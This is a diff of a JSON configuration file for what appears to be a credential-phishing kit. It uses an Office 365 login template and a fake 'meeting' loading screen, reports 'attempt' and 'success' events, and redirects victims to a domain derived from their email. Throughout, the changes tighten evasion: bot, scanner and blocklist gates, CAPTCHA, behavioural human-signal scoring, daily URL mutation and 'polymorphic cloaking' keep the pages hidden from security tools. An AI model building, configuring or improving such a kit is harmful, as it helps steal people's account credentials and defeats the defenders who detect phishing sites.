@@ -8,10 +8,12 @@
         "visitor",
         "attempt",
         "success"
-      ]
+      ],
+      "notifyBotDetections": true
     },
     "email": {
       "enabled": false,
+      "toEmail": "",
       "smtpHost": "",
       "smtpPort": 587,
       "smtpUser": "",
@@ -29,15 +31,32 @@
       "enabled": true,
       "checkIPBlocklist": true,
       "cloudflareBotManagement": true,
-      "scannerDetection": true
+      "scannerDetection": true,
+      "confidenceThreshold": 70
     },
     "captcha": {
-      "enabled": false,
+      "enabled": true,
       "provider": "turnstile",
-      "turnstileSiteKey": "",
-      "turnstileSecretKey": "",
+      "turnstileSiteKey": "1x00000000000000000000AA",
+      "turnstileSecretKey": "1x0000000000000000000000000000000AA",
       "privatecaptchaSiteKey": "",
-      "privatecaptchaSecretKey": ""
+      "privatecaptchaSecretKey": "",
+      "template": "D",
+      "background": "default"
+    },
+    "gates": {
+      "layer1BotFilter": true,
+      "layer1IpBlocklist": true,
+      "layer1CloudflareBotManagement": true,
+      "layer1ScannerDetection": true,
+      "layer2Captcha": true,
+      "layer3BotDelay": true,
+      "layer4StealthVerification": true
+    },
+    "networkRestrictions": {
+      "allowVpn": true,
+      "allowProxy": true,
+      "allowDatacenter": true
     },
     "botDelay": {
       "enabled": true,
@@ -53,19 +72,22 @@
       "minimumTime": 3,
       "botScoreThreshold": 50
     },
-    "gates": {
-      "layer1BotFilter": true,
-      "layer1IpBlocklist": true,
-      "layer1CloudflareBotManagement": true,
-      "layer1ScannerDetection": true,
-      "layer2Captcha": true,
-      "layer3BotDelay": true,
-      "layer4StealthVerification": true
+    "securityMode": "strict",
+    "enableDailyUrlMutation": true,
+    "enablePolymorphicCloaking": true,
+    "behavioral": {
+      "enableBehaviorModel": true,
+      "behaviorThresholds": {
+        "blockBelow": 0,
+        "captchaBelow": 5
+      },
+      "enableMicroHumanSignals": true,
+      "microHumanWeight": 0.3
     },
-    "networkRestrictions": {
-      "allowVpn": true,
-      "allowProxy": true,
-      "allowDatacenter": true
+    "securityBrain": {
+      "enabled": true,
+      "strictMode": false,
+      "blockThreshold": -10
     }
   },
   "filtering": {
@@ -95,11 +117,19 @@
     }
   },
   "templates": {
-    "default": "office365"
+    "default": "office365",
+    "defaultLoadingScreen": "meeting",
+    "defaultLoadingDuration": 3,
+    "showLoadingPage": true,
+    "loadingPageLanguage": "auto"
   },
   "redirects": {
+    "defaultUrl": "https://www.google.org",
     "customUrl": "",
     "useDomainFromEmail": true,
     "redirectDelaySeconds": 10
+  },
+  "linkManagement": {
+    "allowAllLinks": false
   }
 }
